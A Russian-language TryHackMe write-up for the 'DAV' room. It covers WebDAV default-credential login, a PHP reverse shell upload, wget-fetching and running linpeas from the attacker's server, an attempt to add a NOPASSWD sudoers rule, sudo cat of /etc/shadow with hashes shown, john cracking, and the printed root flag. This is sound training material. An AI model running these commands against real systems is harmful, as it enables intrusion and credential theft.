# 🖥️ Отчет по машине: DAV

**Дата:** 2026-04-27
**Платформа:** TryHackMe
**Сложность:** Easy
**Статус:** Done

---

## 📡 1. Разведка 

### Nmap
Первым делом запустил сканирование портов, чтобы увидеть доступные сервисы.

```bash
sudo nmap -sC -sV -A -T4 -p- 10.129.132.16
```
<img width="690" height="258" alt="Снимок экрана 2026-04-27 в 15 49 07" src="https://github.com/user-attachments/assets/af009e62-213f-4acd-b046-8285c3d80289" />

видит только 80 порт проверю иначе возможно порты скрыты либо это подсказка что нужно копать в веб.
```
sudo nmap -sU --top-ports 20 -v 10.129.132.16
```
<img width="314" height="350" alt="Снимок экрана 2026-04-27 в 15 42 16" src="https://github.com/user-attachments/assets/e01d6ca9-8328-4d26-b1dc-515ea86e1b32" />
68 порт, ничего примечательного, стоит сфокусироваться на вебе.

### Порт 80 Стандартная страница сервера Ubuntu
проверю какие папки есть 
dirsearch -u http://ip
<img width="694" height="606" alt="Снимок экрана 2026-04-27 в 16 44 12" src="https://github.com/user-attachments/assets/d28862a9-6d13-424d-b554-5cdcc0b3f75f" />
```
[00:21:08] 401 -  461B  - /webdav/index.html
[00:21:08] 401 -  461B  - /webdav/
[00:21:08] 401 -  461B  - /webdav/servlet/webdav/

```
нашёл /webdav/ (401)
может поддерживать загрузку файлов (возможность для реверса)

Изучить:
- методы
- дефолтные креды - старая версия WebDAV имеет дефолт
Логин: wampp
Пароль: xampp
<img width="524" height="248" alt="Снимок экрана 2026-04-27 в 21 41 28" src="https://github.com/user-attachments/assets/f40732db-a12a-45fe-aba3-f36be4df8e4a" />
в папку dav лежит файл passwd.dav, пытался открыть его через john со словарем rockyou но не вышло, возможно отвлекающий файл? стоит отложить его и изучить другие векторы
<img width="607" height="67" alt="Снимок экрана 2026-04-27 в 21 55 34" src="https://github.com/user-attachments/assets/352fa5b2-fabe-44e1-b366-ae2df52b1718" />
<img width="687" height="189" alt="Снимок экрана 2026-04-27 в 21 55 43" src="https://github.com/user-attachments/assets/2e1076df-0db0-4b9c-b6c2-326efdc14418" /> 
DEV имеет возможность загружать файл, делаю реверс 
```
put namefile
```
в <revshells.com> нужен ip tun0 и любой порт который буду слушать 
выбираю php monkey
<img width="542" height="499" alt="Снимок экрана 2026-04-27 в 21 45 53" src="https://github.com/user-attachments/assets/602645c4-99f5-4fd1-ab9f-1bc343b4db83" />
я внтури как www-data сразу проверяю кто я и где я 
<img width="695" height="668" alt="Снимок экрана 2026-04-27 в 21 45 21" src="https://github.com/user-attachments/assets/74dd248e-2827-4a02-b71e-fc3465b61a99" />
в папке home есть два пользователя в wamp пусто а в merlin там лежит 1й флаг 

```
cat user.txt
```
<img width="581" height="497" alt="Снимок экрана 2026-04-27 в 21 54 05" src="https://github.com/user-attachments/assets/a11adb3f-d560-4f9b-a6ab-52c06191af5c" />
user flag есть теперь prevesc
Решил отправить linpeas:

на атакующей машине
```
sudo python3 -m http.server 80
```
на сервере
```
#забираем файл
wget http://ip/linpeas.sh
#даем права
chmod +x linpeas.sh
#запуск (если слишком большой вывод + (> name.txt))
./linpeas
```
linpeas показал что есть writebale sudoers.bak но у www-data есть возможность только читать вектор закрыт.
Так как при чтении через sudo возникает ошибка "no tty" стоит создать псевдо терминал 
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
теперь есть возможность использовать "sudo cat"
```
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.bak
sudo su -
sudo: no tty present and no askpass program specified
$ sudo -i
sudo: no tty present and no askpass program specified
```
Раз есть возможность "NOPASS cat" решил почитать файлы с паролями и логами, стоит начать с паролей, действовать нужно от простого к сложному

Пароли: 
root - входит без пароля
wampp - sha256 (начинается с $6$)
merlin - md5 (начинается с $1$)
```
www-data@ubuntu:/$ sudo cat /etc/shadow
sudo cat /etc/shadow
root:!:18134:0:99999:7::: 
merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD
```
Решил начать с md5, но результата не было, стоит пока уделить внимание логам, что бы узнать интересных пользователей 
```
echo 'merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1' > merlin.hash
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt merlin.hash
```
Читаю логи
```
/var/log/auth.log
```
цель машины стать юзером merlin, он создает файлы от имени root, значит надо вернуться к паролю
```
Aug 25 21:19:31 ubuntu sudo:   merlin : TTY=pts/0 ; PWD=/home/merlin ; USER=root ; COMMAND=/bin/nano /root/root.txt
```
Заигравшись с идеями я упустил самое очевидное sudo -l 
где черным по белому или белым по черному написано 
www-data@ubuntu:/home/merlin$ sudo -l
sudo -l - NOPASSWD: /bin/cat, что дает мне право читать root.txt, 
```
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
Вот можно почитать root.txt свободно....
```
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
www-data@ubuntu:/home/merlin$ 
```
Мораль машины такова: нужно быть внимательней и как я сам писал "От простого к сложному". Машина на самом деле классная, если новичок (как я) быстрей хочеться орудовать експлойтами hashcat и др инструментами и уязвимостями, но порой все сильно поверхсостней чем кажется на первый взгляд.
ps этот вывод больше для меня, уверен есть гигачады что решили машину за 40 секунд без клавы и компа, но я не вы и это мои первые машины, всем добра)

